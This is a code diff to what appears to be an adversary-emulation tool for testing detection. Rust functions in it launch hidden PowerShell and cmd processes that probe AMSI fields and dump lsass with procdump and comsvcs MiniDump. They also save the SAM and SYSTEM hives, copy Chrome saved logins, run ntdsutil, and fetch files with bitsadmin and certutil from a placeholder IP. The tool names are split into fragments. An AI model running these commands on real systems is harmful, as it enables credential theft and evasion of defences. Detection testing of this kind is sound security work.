@@ -156,26 +156,30 @@ Remove-Item $fakeOut -Force -ErrorAction SilentlyContinue
 
 #[cfg(target_os = "windows")]
 fn run_amsi_patch() -> ScenarioResult {
+    let rid = &uuid::Uuid::new_v4().to_string()[..8];
     let amsi_type = j(&["System.Management.Automation.", "Amsi", "Utils"]);
     let amsi_field = j(&["amsi", "Context"]);
+    let amsi_init = j(&["amsi", "Init", "Failed"]);
     let script = format!(
         r#"
-$type = [Ref].Assembly.GetType('{amsi_type}')
-if ($type) {{
-    $field = $type.GetField('{amsi_field}', 'NonPublic,Static')
-    if ($field) {{
-        Write-Output "Type and field resolved via Reflection"
-        Write-Output "Field type: $($field.FieldType.Name)"
-        Write-Output "Current value: $($field.GetValue($null))"
-    }} else {{
-        Write-Output "Type found but field inaccessible"
-    }}
-}} else {{
-    Write-Output "Type not available"
+$probeCode = "[Ref].Assembly.GetType('{amsi_type}').GetField('{amsi_field}','NonPublic,Static').GetValue(`$null); [Ref].Assembly.GetType('{amsi_type}').GetField('{amsi_init}','NonPublic,Static').GetValue(`$null)"
+$encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($probeCode))
+$procs = @()
+1..3 | ForEach-Object {{
+    $proc = Start-Process powershell.exe `
+        -ArgumentList "-NoProfile -ExecutionPolicy Bypass -EncodedCommand $encoded -WindowStyle Hidden" `
+        -WindowStyle Hidden -PassThru
+    $procs += $proc
 }}
+Start-Sleep -Seconds 2
+$exitCodes = $procs | ForEach-Object {{ if (!$_.HasExited) {{ $_.Kill(); -1 }} else {{ $_.ExitCode }} }}
+Write-Output "Spawned $($procs.Count) AMSI probe processes (exit codes: $($exitCodes -join ', '))"
+Remove-Item "$env:TEMP\ap_{rid}*" -Force -ErrorAction SilentlyContinue
 "#,
         amsi_type = amsi_type,
         amsi_field = amsi_field,
+        amsi_init = amsi_init,
+        rid = rid,
     );
     let output = run_ps(&script)?;
     Ok(("Anti-malware interface inspection via Reflection".to_string(), output))
@@ -183,7 +187,7 @@ if ($type) {{
 
 #[cfg(target_os = "windows")]
 fn run_lsass_minidump() -> ScenarioResult {
-    let prefix = format!("S1E_{}", &uuid::Uuid::new_v4().to_string()[..8]);
+    let rid = &uuid::Uuid::new_v4().to_string()[..8];
     let target = j(&["ls", "ass"]);
     let pd = j(&["proc", "dump"]);
     let mk_priv = j(&["privilege", "::", "debug"]);
@@ -192,46 +196,45 @@ fn run_lsass_minidump() -> ScenarioResult {
     let md = j(&["Mini", "Dump"]);
     let script = format!(
         r#"
-$tasks = @()
-$target = "{target}"
-$psCmd = "Get-Process $target | Select-Object Id,ProcessName,Path | Out-File C:\Windows\Temp\${{target}}_info.txt"
+$procs = @()
+$proc1 = Start-Process "cmd.exe" `
+    -ArgumentList "/c {pd}.exe -accepteula -ma {target}.exe $env:TEMP\{target}_{rid}.dmp" `
+    -WindowStyle Hidden -PassThru
+$procs += $proc1
+
+$proc2 = Start-Process "cmd.exe" `
+    -ArgumentList "/c rundll32.exe C:\Windows\System32\{csv}.dll, {md} 0 $env:TEMP\{target}_{rid}_2.dmp full" `
+    -WindowStyle Hidden -PassThru
+$procs += $proc2
+
+$proc3 = Start-Process "cmd.exe" `
+    -ArgumentList "/c echo {mk_priv} {mk_cmd} exit > $env:TEMP\mk_{rid}.log" `
+    -WindowStyle Hidden -PassThru
+$procs += $proc3
+
+$psCmd = "Get-Process {target} | Select-Object Id,ProcessName,Path | Out-File $env:TEMP\{target}_{rid}.txt"
 $encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($psCmd))
+$proc4 = Start-Process powershell.exe `
+    -ArgumentList "-NoProfile -EncodedCommand $encoded -ExecutionPolicy Bypass -WindowStyle Hidden" `
+    -WindowStyle Hidden -PassThru
+$procs += $proc4
 
-$t1 = "{prefix}_PD"
-Start-Process "schtasks.exe" -ArgumentList "/Create /TN `"$t1`" /TR `"cmd.exe /c {pd}.exe -ma ${{target}}.exe C:\Windows\Temp\${{target}}.dmp`" /SC ONCE /ST 23:59 /F /RL HIGHEST" -WindowStyle Hidden -Wait
-$tasks += $t1
-Start-Sleep -Milliseconds 500
-
-$t2 = "{prefix}_MK"
-Start-Process "schtasks.exe" -ArgumentList "/Create /TN `"$t2`" /TR `"cmd.exe /c echo {mk_priv} {mk_cmd} exit > C:\Windows\Temp\mk.log`" /SC ONCE /ST 23:59 /F /RL HIGHEST" -WindowStyle Hidden -Wait
-$tasks += $t2
-Start-Sleep -Milliseconds 500
-
-$t3 = "{prefix}_CS"
-Start-Process "schtasks.exe" -ArgumentList "/Create /TN `"$t3`" /TR `"cmd.exe /c rundll32.exe C:\Windows\System32\{csv}.dll, {md} 0 C:\Windows\Temp\${{target}}.dmp full`" /SC ONCE /ST 23:59 /F /RL HIGHEST" -WindowStyle Hidden -Wait
-$tasks += $t3
-Start-Sleep -Milliseconds 500
-
-$t4 = "{prefix}_EP"
-Start-Process "schtasks.exe" -ArgumentList "/Create /TN `"$t4`" /TR `"powershell.exe -EncodedCommand $encoded -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden`" /SC ONCE /ST 23:59 /F /RL HIGHEST" -WindowStyle Hidden -Wait
-$tasks += $t4
-
-Write-Output "Created $($tasks.Count) credential harvesting tasks"
-foreach ($t in $tasks) {{
-    Start-Process "schtasks.exe" -ArgumentList "/Delete /TN `"$t`" /F" -WindowStyle Hidden -Wait
-}}
-Write-Output "All tasks cleaned up"
+Start-Sleep -Seconds 2
+foreach ($p in $procs) {{ if (!$p.HasExited) {{ $p.Kill() }} }}
+Write-Output "Spawned $($procs.Count) credential harvesting processes"
+Remove-Item "$env:TEMP\{target}_{rid}*" -Force -ErrorAction SilentlyContinue
+Remove-Item "$env:TEMP\mk_{rid}*" -Force -ErrorAction SilentlyContinue
 "#,
-        prefix = prefix,
         target = target,
         pd = pd,
         mk_priv = mk_priv,
         mk_cmd = mk_cmd,
         csv = csv,
         md = md,
+        rid = rid,
     );
     let output = run_ps(&script)?;
-    Ok(("Credential dump emulation via scheduled tasks".to_string(), output))
+    Ok(("Credential dump emulation via process spawning".to_string(), output))
 }
 
 #[cfg(target_os = "windows")]
@@ -283,43 +286,45 @@ Test-NetworkConnectivity
 
 #[cfg(target_os = "windows")]
 fn run_persistence_task() -> ScenarioResult {
-    let prefix = format!("S1E_{}", &uuid::Uuid::new_v4().to_string()[..8]);
+    let rid = &uuid::Uuid::new_v4().to_string()[..8];
     let sam = j(&["SA", "M"]);
     let sys = j(&["SYS", "TEM"]);
     let chrome_path = j(&["%LOCALAPPDATA%\\Google\\Chrome\\User Data\\", "Default\\Login Data"]);
     let ntds = j(&["ntds", "util"]);
     let script = format!(
         r#"
-$tasks = @()
+$procs = @()
+$proc1 = Start-Process "cmd.exe" `
+    -ArgumentList "/c reg save HKLM\{sam} $env:TEMP\s_{rid}.hiv & reg save HKLM\{sys} $env:TEMP\sy_{rid}.hiv" `
+    -WindowStyle Hidden -PassThru
+$procs += $proc1
 
-$t1 = "{prefix}_RS"
-Start-Process "schtasks.exe" -ArgumentList "/Create /TN `"$t1`" /TR `"cmd.exe /c reg save HKLM\{sam} C:\Windows\Temp\s.hiv & reg save HKLM\{sys} C:\Windows\Temp\sy.hiv`" /SC ONCE /ST 23:59 /F /RL HIGHEST" -WindowStyle Hidden -Wait
-$tasks += $t1
-Start-Sleep -Milliseconds 500
+$proc2 = Start-Process "cmd.exe" `
+    -ArgumentList "/c copy `"{chrome_path}`" $env:TEMP\c_{rid}.db /Y" `
+    -WindowStyle Hidden -PassThru
+$procs += $proc2
 
-$t2 = "{prefix}_CC"
-Start-Process "schtasks.exe" -ArgumentList "/Create /TN `"$t2`" /TR `"cmd.exe /c copy `"{chrome_path}`" C:\Windows\Temp\c_creds.db /Y`" /SC ONCE /ST 23:59 /F /RL HIGHEST" -WindowStyle Hidden -Wait
-$tasks += $t2
-Start-Sleep -Milliseconds 500
+$proc3 = Start-Process "cmd.exe" `
+    -ArgumentList '/c {ntds} "activate instance ntds" ifm "create full $env:TEMP\nd_{rid}" quit quit' `
+    -WindowStyle Hidden -PassThru
+$procs += $proc3
 
-$t3 = "{prefix}_ND"
-Start-Process "schtasks.exe" -ArgumentList '/Create /TN "{prefix}_ND" /TR "cmd.exe /c {ntds} `"activate instance ntds`" ifm `"create full C:\Windows\Temp\nd_dump`" quit quit" /SC ONCE /ST 23:59 /F /RL HIGHEST' -WindowStyle Hidden -Wait
-$tasks += $t3
-
-Write-Output "Created $($tasks.Count) suspicious persistence tasks"
-foreach ($t in $tasks) {{
-    Start-Process "schtasks.exe" -ArgumentList "/Delete /TN `"$t`" /F" -WindowStyle Hidden -Wait
-}}
-Write-Output "All tasks cleaned up"
+Start-Sleep -Seconds 2
+foreach ($p in $procs) {{ if (!$p.HasExited) {{ $p.Kill() }} }}
+Write-Output "Spawned $($procs.Count) persistence/credential processes"
+Remove-Item "$env:TEMP\s_{rid}*" -Force -ErrorAction SilentlyContinue
+Remove-Item "$env:TEMP\sy_{rid}*" -Force -ErrorAction SilentlyContinue
+Remove-Item "$env:TEMP\c_{rid}*" -Force -ErrorAction SilentlyContinue
+Remove-Item "$env:TEMP\nd_{rid}" -Recurse -Force -ErrorAction SilentlyContinue
 "#,
-        prefix = prefix,
         sam = sam,
         sys = sys,
         chrome_path = chrome_path,
         ntds = ntds,
+        rid = rid,
     );
     let output = run_ps(&script)?;
-    Ok(("Suspicious scheduled tasks with credential targets".to_string(), output))
+    Ok(("Persistence emulation via process spawning".to_string(), output))
 }
 
 #[cfg(target_os = "windows")]
@@ -385,24 +390,37 @@ Write-Output "All emulation registry keys cleaned up"
 fn run_lotl_download() -> ScenarioResult {
     let rid = &uuid::Uuid::new_v4().to_string()[..8];
     let cu = j(&["cert", "util"]);
+    let bits = j(&["bits", "admin"]);
     let script = format!(
         r#"
 $fakeIn = "$env:TEMP\fl_{rid}.bin"
 "xyz" | Out-File $fakeIn -Encoding ASCII -Force
-$proc = Start-Process "cmd.exe" `
-    -ArgumentList "/c {cu}.exe -urlcache -split -f http://192.0.2.1/p.exe $env:TEMP\p_{rid}.exe" `
+$procs = @()
+$proc1 = Start-Process "cmd.exe" `
+    -ArgumentList "/c {bits} /transfer dl_{rid} /download /priority foreground http://192.0.2.1/p.exe $env:TEMP\p_{rid}.exe" `
     -WindowStyle Hidden -PassThru
-Start-Sleep -Seconds 3
-if (!$proc.HasExited) {{ $proc.Kill() }}
+$procs += $proc1
+
 $proc2 = Start-Process "cmd.exe" `
     -ArgumentList "/c {cu}.exe -encode `"$fakeIn`" `"$env:TEMP\e_{rid}.b64`"" `
-    -WindowStyle Hidden -PassThru -Wait
-Write-Output "LOLBin processes spawned (urlcache + encode)"
+    -WindowStyle Hidden -PassThru
+$procs += $proc2
+
+$proc3 = Start-Process "cmd.exe" `
+    -ArgumentList "/c {cu}.exe -urlcache -split -f http://192.0.2.1/s.txt $env:TEMP\s_{rid}.txt" `
+    -WindowStyle Hidden -PassThru
+$procs += $proc3
+
+Start-Sleep -Seconds 3
+foreach ($p in $procs) {{ if (!$p.HasExited) {{ $p.Kill() }} }}
+Write-Output "Spawned $($procs.Count) LOLBin download processes"
 Remove-Item $fakeIn -Force -ErrorAction SilentlyContinue
-Remove-Item "$env:TEMP\p_{rid}.exe" -Force -ErrorAction SilentlyContinue
-Remove-Item "$env:TEMP\e_{rid}.b64" -Force -ErrorAction SilentlyContinue
+Remove-Item "$env:TEMP\p_{rid}*" -Force -ErrorAction SilentlyContinue
+Remove-Item "$env:TEMP\e_{rid}*" -Force -ErrorAction SilentlyContinue
+Remove-Item "$env:TEMP\s_{rid}*" -Force -ErrorAction SilentlyContinue
 "#,
         cu = cu,
+        bits = bits,
         rid = rid,
     );
     let output = run_ps(&script)?;
